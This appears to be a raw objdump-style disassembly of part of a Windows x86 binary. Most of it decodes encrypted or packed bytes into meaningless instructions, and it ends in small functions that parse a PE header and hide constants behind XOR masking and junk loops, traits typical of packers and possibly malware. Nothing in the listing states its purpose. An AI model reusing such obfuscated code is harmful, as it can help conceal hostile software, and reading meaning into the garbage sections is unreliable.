  41f27a:	pop    esi
  41f27b:	sub    DWORD PTR [edx-0x3efca36b],ecx
  41f281:	popa   
  41f282:	mov    ah,0x25
  41f284:	xchg   edx,eax
  41f285:	nop
  41f286:	je     0x41f304
  41f288:	sbb    al,0x36
  41f28a:	jp     0x41f23e
  41f28c:	sbb    dh,BYTE PTR [edi]
  41f28e:	repz add ecx,DWORD PTR [ecx]
  41f291:	pop    esi
  41f292:	inc    esp
  41f293:	xchg   BYTE PTR [ecx+0x20],ah
  41f296:	adc    DWORD PTR [ecx-0x2d],0x9f1716e4
  41f29d:	ret    0x3e95
  41f2a0:	cdq    
  41f2a1:	xchg   esi,edx
  41f2a3:	push   ecx
  41f2a4:	mov    al,ds:0x45a11007
  41f2a9:	jmp    0x5fe:0xcf659c44
  41f2b0:	test   ah,bl
  41f2b2:	pop    ds
  41f2b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2b4:	sub    ah,BYTE PTR [ebx-0x1b8883ab]
  41f2ba:	scas   al,BYTE PTR es:[edi]
  41f2bb:	aad    0x46
  41f2bd:	mov    al,ds:0xaa801aed
  41f2c2:	push   ebp
  41f2c3:	mov    esp,0xd53f3375
  41f2c8:	xor    DWORD PTR [esi+0x63a50a5d],ebx
  41f2ce:	les    esp,FWORD PTR [eax]
  41f2d0:	lds    ebp,FWORD PTR [edi+eax*8+0x71dbe2a3]
  41f2d7:	xor    BYTE PTR cs:[ebp+ecx*1-0x74],dl
  41f2dc:	cmp    DWORD PTR [edi+eiz*8+0x6d],0x6a4508f4
  41f2e4:	sbb    ecx,DWORD PTR [ecx+0x7c6ebf0d]
  41f2ea:	push   ebx
  41f2eb:	mov    cl,0x1f
  41f2ed:	and    ebx,DWORD PTR [esi+0x580efb70]
  41f2f3:	add    edi,DWORD PTR [esi+eax*8-0x48b6f836]
  41f2fa:	outs   dx,BYTE PTR ds:[esi]
  41f2fb:	out    0xd0,eax
  41f2fd:	or     ecx,DWORD PTR [esi]
  41f2ff:	(bad)  
  41f300:	cmp    bh,al
  41f302:	or     eax,0xf386a1fb
  41f307:	pop    esp
  41f308:	cdq    
  41f309:	lock xor dh,dh
  41f30c:	push   edx
  41f30d:	dec    edi
  41f30e:	shl    DWORD PTR [ecx-0x9c0064c],cl
  41f314:	mov    esp,0x169cdf4b
  41f319:	loop   0x41f398
  41f31b:	popf   
  41f31c:	call   0x3f421f64
  41f321:	imul   eax,esi,0x8e26e3c6
  41f327:	jl     0x41f365
  41f329:	(bad)  
  41f32a:	push   0x5f6294f8
  41f32f:	test   BYTE PTR [edi-0x2],bl
  41f332:	jb     0x41f392
  41f334:	imul   edx,eax,0x37
  41f337:	mov    al,0x4c
  41f339:	pop    edx
  41f33a:	push   0xb1eef8f3
  41f33f:	inc    edi
  41f340:	jg     0x41f2fa
  41f342:	sbb    ebp,DWORD PTR [ebx-0x7a]
  41f345:	sar    DWORD PTR [ebx+ebp*1-0x76],0xf8
  41f34a:	xchg   BYTE PTR [ecx],ch
  41f34c:	adc    DWORD PTR [esi-0x29],esp
  41f34f:	mov    eax,ebx
  41f351:	xor    eax,0xf1829365
  41f356:	out    dx,al
  41f357:	pushf  
  41f358:	aaa    
  41f359:	aas    
  41f35a:	popa   
  41f35b:	inc    ecx
  41f35c:	pop    edi
  41f35d:	ja     0x41f3bc
  41f35f:	fs jg  0x41f35a
  41f362:	pop    ebp
  41f363:	scas   al,BYTE PTR es:[edi]
  41f364:	leave  
  41f365:	mov    ds:0x133576ff,eax
  41f36a:	xchg   ecx,eax
  41f36b:	pusha  
  41f36c:	adc    cl,BYTE PTR [esi+0x47]
  41f36f:	cmp    esp,DWORD PTR [eax]
  41f371:	cmp    eax,0x602cfcb3
  41f376:	aaa    
  41f377:	sbb    BYTE PTR [ebx+eax*2],al
  41f37a:	out    dx,al
  41f37b:	sub    eax,0x9a9fa561
  41f380:	dec    esi
  41f381:	mov    ebx,0x34ea4298
  41f386:	jbe    0x41f3d5
  41f388:	jmp    0xd1808129
  41f38d:	xchg   ebx,eax
  41f38e:	dec    ebp
  41f38f:	cmp    esp,edx
  41f391:	cmp    BYTE PTR [edx-0x538653d5],bh
  41f397:	mov    bl,0xf9
  41f399:	int    0xaf
  41f39b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f39c:	std    
  41f39d:	test   eax,0x223b9627
  41f3a2:	daa    
  41f3a3:	mov    edx,0x5d6be218
  41f3a8:	adc    BYTE PTR [esp+esi*8+0x59],0x68
  41f3ad:	mov    edx,0x8a5297d9
  41f3b2:	cwde   
  41f3b3:	aam    0x1d
  41f3b5:	enter  0x82d5,0xf7
  41f3b9:	add    BYTE PTR [edx],bh
  41f3bb:	repnz or BYTE PTR [ecx-0x25d94718],ch
  41f3c2:	push   eax
  41f3c3:	or     edi,DWORD PTR [esi+0x5edeff89]
  41f3c9:	shr    BYTE PTR ds:0x4ff4316d,cl
  41f3cf:	shl    BYTE PTR [ecx+ebp*4],1
  41f3d2:	(bad)  [ebp+0x7da8df]
  41f3d8:	cli    
  41f3d9:	pop    ebp
  41f3da:	outs   dx,DWORD PTR ds:[esi]
  41f3db:	fs es and ebp,ecx
  41f3df:	ret    0xce37
  41f3e2:	pop    edx
  41f3e3:	sub    bl,BYTE PTR [esi+eax*2]
  41f3e6:	loopne 0x41f440
  41f3e8:	sbb    eax,0x535d1656
  41f3ed:	cmc    
  41f3ee:	sbb    eax,edx
  41f3f0:	push   eax
  41f3f1:	leave  
  41f3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f3:	or     al,0x53
  41f3f5:	xchg   BYTE PTR [edx],dl
  41f3f7:	add    ebp,esp
  41f3f9:	push   edi
  41f3fb:	xchg   edi,eax
  41f3fc:	ja     0x41f438
  41f3fe:	mov    ecx,0x27f07cc3
  41f403:	jb     0x41f3ff
  41f405:	mov    BYTE PTR [esi+0x7d],ah
  41f408:	mov    dl,0xc5
  41f40a:	icebp  
  41f40b:	sti    
  41f40c:	push   edi
  41f40d:	sub    edx,DWORD PTR [ebp+eax*8-0x8]
  41f411:	inc    ebp
  41f412:	lahf   
  41f413:	sub    dh,BYTE PTR [edx-0x64ab9e2e]
  41f419:	or     edi,DWORD PTR [ebx*1-0x32650b21]
  41f420:	or     DWORD PTR [ebx+esi*4+0x7a98894d],edx
  41f427:	enter  0x2c7c,0x15
  41f42b:	not    ebx
  41f42d:	add    DWORD PTR [esi],ecx
  41f42f:	jo     0x41f499
  41f431:	inc    ebp
  41f432:	call   DWORD PTR fs:[edx+0x20]
  41f436:	mov    ch,0xf4
  41f438:	aad    0xd5
  41f43a:	sub    eax,0xa144f004
  41f43f:	shr    al,1
  41f441:	push   ecx
  41f442:	add    DWORD PTR [eax+0x42269b03],0xbf65f5ca
  41f44c:	add    dl,al
  41f44e:	les    eax,FWORD PTR [ebp-0x62]
  41f451:	loope  0x41f4ae
  41f453:	in     al,dx
  41f454:	sub    WORD PTR [esp+ecx*2],cx
  41f458:	mov    al,ds:0x980cc1bd
  41f45d:	mov    ch,0xeb
  41f45f:	xchg   DWORD PTR [edx],ebp
  41f461:	clc    
  41f462:	lea    edi,[ebx+0xc]
  41f465:	aad    0x33
  41f467:	cmp    al,0x84
  41f469:	push   esi
  41f46a:	clc    
  41f46b:	mov    ds:0x71fe0127,eax
  41f470:	or     al,0xb1
  41f472:	fdiv   st(7),st
  41f474:	xchg   ebp,eax
  41f475:	(bad)  
  41f476:	sti    
  41f477:	faddp  st(7),st
  41f479:	sub    eax,0xb35ef2e0
  41f47e:	add    al,BYTE PTR [eax+0x15372189]
  41f484:	xchg   esp,eax
  41f485:	bound  edx,QWORD PTR [ecx-0x11]
  41f488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f489:	fisttp WORD PTR [edx]
  41f48b:	loop   0x41f45e
  41f48d:	push   eax
  41f48e:	(bad)  [ebp+0x60]
  41f491:	sub    ecx,edi
  41f493:	xchg   ebp,eax
  41f494:	popf   
  41f495:	add    al,0x9c
  41f497:	sti    
  41f498:	out    dx,eax
  41f499:	xchg   ebx,eax
  41f49a:	jns    0x41f455
  41f49c:	xchg   edx,eax
  41f49d:	test   BYTE PTR [eax],al
  41f49f:	xchg   ebp,eax
  41f4a0:	cmp    eax,0x8f47d1e4
  41f4a5:	jnp    0x41f51f
  41f4a7:	inc    ecx
  41f4a8:	(bad)  
  41f4a9:	push   esi
  41f4aa:	loop   0x41f47d
  41f4ac:	inc    edx
  41f4ad:	aad    0x6c
  41f4af:	mov    ebx,0xfcab3621
  41f4b4:	sub    DWORD PTR [edi+0x1293ec6d],esp
  41f4ba:	and    esp,DWORD PTR ds:0x6c61d0f8
  41f4c0:	aas    
  41f4c1:	cwde   
  41f4c2:	push   ds
  41f4c3:	retf   0xc8a9
  41f4c6:	cmp    eax,0xdd01c502
  41f4cb:	mov    ds:0xcaaf7716,al
  41f4d0:	pop    ebx
  41f4d1:	cwde   
  41f4d2:	xor    DWORD PTR [ebx],ecx
  41f4d4:	mov    BYTE PTR [esi+0x2da96f01],cl
  41f4da:	mov    bh,0xa8
  41f4dc:	outs   dx,DWORD PTR ds:[esi]
  41f4dd:	push   cs
  41f4de:	push   cs
  41f4df:	or     BYTE PTR [edi+0x10368dee],al
  41f4e5:	inc    eax
  41f4e6:	les    eax,FWORD PTR [ecx-0x5166650]
  41f4ec:	mov    WORD PTR [eax+0x7fc672a1],?
  41f4f2:	clc    
  41f4f3:	sbb    BYTE PTR [ebx+0x2a418e04],bh
  41f4f9:	xchg   esp,eax
  41f4fa:	fld    DWORD PTR [eax]
  41f4fc:	jmp    0x9433:0xe072886
  41f503:	fdivr  st,st(5)
  41f505:	(bad)  
  41f507:	push   eax
  41f508:	(bad)  
  41f509:	out    0x38,eax
  41f50b:	arpl   WORD PTR [edi+ebx*1-0x2b8253a0],si
  41f512:	mov    eax,ds:0x1c0e0356
  41f517:	xchg   ebp,eax
  41f518:	mov    bh,0xd6
  41f51a:	and    ebp,ebx
  41f51c:	aaa    
  41f51d:	mov    edx,DWORD PTR [edi+ebx*1+0x62c4396d]
  41f524:	push   ecx
  41f525:	in     al,dx
  41f526:	push   es
  41f527:	and    al,dh
  41f529:	std    
  41f52a:	add    eax,0x1e48b9f4
  41f52f:	leave  
  41f530:	add    al,0xff
  41f532:	sub    BYTE PTR [ebp+0x6e9d3fa8],0x58
  41f539:	js     0x41f56b
  41f53b:	mov    bh,0x4
  41f53d:	jmp    0xa10a:0x2bcea16f
  41f544:	shl    BYTE PTR [esi],0x25
  41f547:	mov    ds:0xe9d1be84,eax
  41f54c:	pop    eax
  41f54d:	jnp    0x41f517
  41f54f:	xor    ebp,DWORD PTR [edx+0x4b9139d1]
  41f555:	or     BYTE PTR [bp+di-0x22d],0xe2
  41f55b:	repnz mov ah,0xf5
  41f55e:	or     esi,DWORD PTR [edi+0x3c96881b]
  41f564:	ror    BYTE PTR [ecx+ebx*4-0x67a8a3fa],0xe
  41f56c:	stc    
  41f56d:	mov    eax,ds:0x3f0a31ab
  41f572:	jg     0x41f5a9
  41f574:	or     cl,dh
  41f576:	inc    ecx
  41f577:	xor    cl,ah
  41f579:	mov    ebp,0x8c795850
  41f57e:	std    
  41f57f:	sub    dh,BYTE PTR [ecx]
  41f581:	mov    cl,0x61
  41f583:	clc    
  41f584:	lock mov ds:0x5df17b44,eax
  41f58a:	sti    
  41f58b:	xor    BYTE PTR [edi+edx*1-0x342fca67],0x95
  41f593:	jmp    0xbf26:0xca486913
  41f59a:	cmp    DWORD PTR [edx],ebx
  41f59c:	cmp    eax,0xd1f09ed4
  41f5a1:	pop    eax
  41f5a2:	push   ss
  41f5a3:	pop    esi
  41f5a4:	adc    edi,DWORD PTR [esp+edx*2-0x15]
  41f5a8:	push   cs
  41f5a9:	ja     0x41f5d0
  41f5ab:	mov    edi,DWORD PTR ss:[ecx+0x1e]
  41f5af:	dec    eax
  41f5b0:	mov    bh,0x21
  41f5b2:	push   eax
  41f5b3:	cli    
  41f5b4:	jmp    0x41f60b
  41f5b6:	ins    DWORD PTR es:[edi],dx
  41f5b7:	jg     0x41f55b
  41f5b9:	adc    ebp,DWORD PTR [edi+0x6]
  41f5bc:	mov    WORD PTR [ecx+0x76],gs
  41f5bf:	xor    al,0x70
  41f5c1:	add    eax,0x95d09f0c
  41f5c6:	pushf  
  41f5c7:	push   esi
  41f5c8:	xchg   BYTE PTR [esp+edx*1],al
  41f5cb:	add    edx,DWORD PTR [edx+0x44b8901f]
  41f5d1:	cmp    al,BYTE PTR [ecx+0x5571c37f]
  41f5d7:	std    
  41f5d8:	out    dx,eax
  41f5d9:	or     esp,DWORD PTR [ecx]
  41f5db:	fidivr WORD PTR [edx]
  41f5dd:	add    DWORD PTR [edi-0x55],0x644b09b4
  41f5e4:	inc    eax
  41f5e5:	das    
  41f5e6:	in     eax,dx
  41f5e7:	xlat   BYTE PTR ds:[ebx]
  41f5e8:	xor    ebx,DWORD PTR [esi-0x8205747]
  41f5ee:	and    al,0xbc
  41f5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5f1:	push   ss
  41f5f2:	cli    
  41f5f3:	or     DWORD PTR [esi],eax
  41f5f5:	cmp    bl,dh
  41f5f7:	scas   eax,DWORD PTR es:[edi]
  41f5f8:	xchg   ebp,eax
  41f5f9:	and    al,dl
  41f5fb:	dec    ecx
  41f5fc:	sub    al,0x4c
  41f5fe:	rol    BYTE PTR [esi-0x6c],1
  41f601:	lds    eax,FWORD PTR [esp+eax*2-0x527d518d]
  41f608:	sub    eax,0x76900397
  41f60d:	mov    WORD PTR gs:[edi-0x5013283],?
  41f614:	mov    esp,0x119fa906
  41f619:	stos   DWORD PTR es:[edi],eax
  41f61a:	mov    edx,0xe4faa001
  41f61f:	enter  0x1a92,0x92
  41f623:	rcr    DWORD PTR [esi+0x7c],1
  41f626:	mov    cl,0xd8
  41f628:	jl     0x41f69b
  41f62a:	aad    0xeb
  41f62c:	adc    dl,BYTE PTR [edi-0x3b]
  41f62f:	scas   eax,DWORD PTR es:[edi]
  41f630:	into   
  41f631:	adc    DWORD PTR [ebx-0x3f],0x45
  41f635:	mov    dh,0x6a
  41f637:	mov    ds:0xce2d18d,al
  41f63c:	jle    0x41f608
  41f63e:	jg     0x41f605
  41f640:	sar    DWORD PTR [edx-0x1a43af80],1
  41f646:	cdq    
  41f647:	push   cs
  41f648:	cdq    
  41f649:	das    
  41f64a:	jl     0x41f65a
  41f64c:	adc    al,0x8d
  41f64e:	icebp  
  41f64f:	cld    
  41f650:	jmp    0x41f687
  41f652:	call   0x4cbf:0xc6c38ed
  41f659:	in     eax,dx
  41f65a:	fisttp DWORD PTR [ebp-0x15]
  41f65d:	rcr    DWORD PTR ds:[ebp-0x2a6b1123],cl
  41f664:	test   dl,ah
  41f666:	dec    esp
  41f667:	add    eax,0x18dfdf32
  41f66c:	imul   eax,DWORD PTR [ecx+0x32],0xffffffa0
  41f670:	adc    al,0xe2
  41f672:	mov    ds:0x2971dea7,al
  41f677:	fild   QWORD PTR [eax]
  41f679:	add    eax,0x58c309d3
  41f67e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f67f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f680:	in     eax,0x38
  41f682:	mov    eax,ds:0xa26b82d2
  41f687:	and    dh,BYTE PTR [ecx+0x26]
  41f68a:	add    ecx,edi
  41f68c:	cwde   
  41f68d:	cmc    
  41f68e:	sub    edi,DWORD PTR [esi-0x1c513bb2]
  41f694:	dec    ebp
  41f695:	leave  
  41f696:	cmp    eax,0xcd531013
  41f69b:	mov    dh,0xe3
  41f69d:	scas   eax,DWORD PTR es:[edi]
  41f69e:	xor    DWORD PTR [ecx+0x4e],0x698cbce1
  41f6a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6a6:	rcl    DWORD PTR [ebp-0x591d7cbe],0x3b
  41f6ad:	mov    al,ds:0x7a60c60e
  41f6b2:	scas   al,BYTE PTR es:[edi]
  41f6b3:	lods   al,BYTE PTR ds:[esi]
  41f6b4:	push   esi
  41f6b5:	xor    BYTE PTR [edi-0x6cbf9942],dl
  41f6bb:	pop    ebx
  41f6bc:	test   eax,0x688731bf
  41f6c1:	retf   
  41f6c2:	sbb    cl,ch
  41f6c4:	add    dl,dl
  41f6c6:	jg     0x41f6a2
  41f6c8:	and    ebx,esp
  41f6ca:	push   ebp
  41f6cb:	into   
  41f6cc:	pop    edx
  41f6cd:	mov    WORD PTR [ebp-0x2d7b3f55],ss
  41f6d3:	jl     0x41f702
  41f6d5:	lods   al,BYTE PTR ds:[esi]
  41f6d6:	cs std 
  41f6d8:	xchg   ebp,eax
  41f6d9:	push   cs
  41f6da:	int3   
  41f6db:	pop    esp
  41f6dc:	jl     0x41f6b7
  41f6de:	xchg   BYTE PTR [ebx-0x54],al
  41f6e1:	test   al,0xa7
  41f6e3:	out    dx,al
  41f6e4:	std    
  41f6e5:	dec    edx
  41f6e6:	or     eax,0x96f423fc
  41f6eb:	icebp  
  41f6ec:	sub    eax,edi
  41f6ee:	xchg   ebx,eax
  41f6ef:	xchg   edx,eax
  41f6f0:	sbb    al,0x41
  41f6f2:	adc    ah,BYTE PTR [ebp+edx*8+0x76]
  41f6f6:	mov    ebx,0x3715a102
  41f6fb:	retf   
  41f6fc:	sub    DWORD PTR [ebx],eax
  41f6fe:	lahf   
  41f6ff:	shl    BYTE PTR ds:0xd2a2c42c,0x57
  41f706:	adc    al,0x7
  41f708:	lds    ebx,FWORD PTR [eax]
  41f70a:	push   ecx
  41f70b:	out    0x93,al
  41f70d:	pop    edi
  41f70e:	adc    esp,DWORD PTR [ebx]
  41f710:	push   cx
  41f712:	loop   0x41f721
  41f714:	js     0x41f6da
  41f716:	call   DWORD PTR ds:0x6eda41c1
  41f71c:	js     0x41f6ac
  41f71e:	mov    ecx,0x8e59f3f2
  41f723:	aam    0x68
  41f725:	gs xchg esi,eax
  41f727:	pop    ds
  41f728:	jp     0x41f714
  41f72a:	jmp    0x41f760
  41f72c:	aam    0x20
  41f72e:	jb     0x41f6fe
  41f730:	ror    BYTE PTR ss:[eax-0x38],1
  41f734:	clc    
  41f735:	pop    ebp
  41f736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f737:	jne    0x41f745
  41f739:	adc    ah,BYTE PTR [esi]
  41f73b:	in     al,dx
  41f73c:	or     al,bh
  41f73e:	xchg   ecx,eax
  41f73f:	add    al,0x2f
  41f741:	and    BYTE PTR [edi],al
  41f743:	pop    ecx
  41f744:	data16 and BYTE PTR [esi],0xd2
  41f748:	stos   BYTE PTR es:[edi],al
  41f749:	push   0x6f1441ec
  41f74e:	pop    esp
  41f74f:	test   esp,esi
  41f751:	sub    dh,BYTE PTR [ebx-0x735f70de]
  41f757:	push   ds
  41f758:	sbb    ch,BYTE PTR [esi]
  41f75a:	sbb    ah,BYTE PTR [ecx+0x8]
  41f75d:	adc    esp,DWORD PTR [ecx+ebp*8+0xf]
  41f761:	lds    esi,FWORD PTR [ebp-0x4d2c562e]
  41f767:	cli    
  41f768:	lea    ecx,[ebx+ebp*8-0x353197b8]
  41f76f:	(bad)  
  41f771:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f773:	jne    0x41f7a0
  41f775:	jmp    0x41f717
  41f777:	and    eax,edi
  41f779:	nop
  41f77a:	sbb    ch,BYTE PTR [ebp-0x7a0cbb22]
  41f780:	jecxz  0x41f750
  41f782:	sbb    al,0xa8
  41f784:	jbe    0x41f76e
  41f786:	das    
  41f787:	ret    
  41f788:	out    0x17,eax
  41f78a:	cdq    
  41f78b:	add    al,BYTE PTR [ebp-0x7bc8b41]
  41f791:	pop    edx
  41f792:	mov    ebx,0xbc79d5ed
  41f797:	mov    esi,0x1784e34a
  41f79c:	idiv   DWORD PTR [ecx-0x14de6947]
  41f7a2:	out    0xfb,eax
  41f7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7a5:	ins    DWORD PTR es:[edi],dx
  41f7a6:	push   esp
  41f7a7:	shl    dl,1
  41f7a9:	aaa    
  41f7aa:	cmp    eax,0x4c2cf8c0
  41f7af:	cmp    cl,dl
  41f7b1:	sbb    al,0xe1
  41f7b3:	inc    ebx
  41f7b4:	lahf   
  41f7b5:	loopne 0x41f73e
  41f7b7:	pop    edx
  41f7b8:	sbb    ch,BYTE PTR [ecx]
  41f7ba:	jge    0x41f7fb
  41f7bc:	pop    es
  41f7bd:	fist   WORD PTR [esi]
  41f7bf:	mov    ah,0x40
  41f7c1:	xor    ebp,ecx
  41f7c3:	dec    ebx
  41f7c4:	add    BYTE PTR [eax+ecx*1],ah
  41f7c7:	add    DWORD PTR [ecx-0x45],0xfffffffe
  41f7cb:	pop    esp
  41f7cc:	sbb    al,0x1d
  41f7ce:	jp     0x41f76d
  41f7d0:	mov    BYTE PTR [edx+0x13921398],al
  41f7d6:	in     al,0xc9
  41f7d8:	jmp    0x222d:0x497aa415
  41f7df:	push   0x6da071b8
  41f7e4:	ds mov ah,0xa8
  41f7e7:	test   eax,0xc371de27
  41f7ec:	jno    0x41f7d8
  41f7ee:	mov    ecx,0x97a7bd31
  41f7f3:	xor    eax,0x748cf9d
  41f7f8:	adc    eax,0x2011bce0
  41f7fd:	pop    esi
  41f7fe:	stc    
  41f7ff:	add    bl,0xfb
  41f802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f803:	and    ah,BYTE PTR [esi-0x1e]
  41f806:	popa   
  41f807:	hlt    
  41f808:	add    eax,0x3a6c7092
  41f80d:	lock cmp BYTE PTR [edi+0x7b],al
  41f811:	enter  0x577f,0x6e
  41f815:	inc    ebx
  41f816:	sub    eax,0xe291e103
  41f81b:	xchg   cl,ah
  41f81d:	in     al,dx
  41f81e:	push   esi
  41f81f:	xchg   DWORD PTR [ebx-0x252f2ace],edx
  41f825:	ss je  0x41f83f
  41f828:	mov    al,ds:0x2fd530bd
  41f82d:	sbb    al,0x4a
  41f82f:	in     al,dx
  41f830:	cld    
  41f831:	pop    ds
  41f832:	jmp    0x41f7f4
  41f834:	enter  0xd4ac,0x89
  41f838:	mov    ds:0xece3fe2a,eax
  41f83d:	pop    eax
  41f83e:	int3   
  41f83f:	jmp    0x4f27e8a1
  41f844:	inc    esi
  41f845:	(bad)  
  41f847:	xchg   esi,eax
  41f848:	push   edi
  41f849:	dec    ebp
  41f84a:	sbb    al,0x17
  41f84c:	je     0x41f863
  41f84e:	cld    
  41f84f:	pushf  
  41f850:	jge    0x41f89c
  41f852:	xor    DWORD PTR [esi+0x33],0x3e
  41f856:	xchg   ebx,eax
  41f857:	leave  
  41f858:	mov    cs,WORD PTR [edx-0x38]
  41f85b:	std    
  41f85c:	xor    eax,0x58b492f7
  41f861:	pop    esp
  41f862:	mov    ds:0x5545255b,al
  41f867:	dec    edx
  41f868:	mov    ch,0xe6
  41f86a:	jnp    0x41f870
  41f86c:	jl     0x41f82e
  41f86e:	and    ecx,DWORD PTR [esp+edx*8]
  41f871:	jno    0x41f8da
  41f873:	jl     0x41f8ac
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429ec5
  41f8e9:	mov    edx,DWORD PTR ds:0x42af1d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x42fa00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x42fa40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	sbb    BYTE PTR [ebp-0x3fa506a4],0x66
  41faab:	dec    ebp
  41faac:	mov    es,WORD PTR [edi]
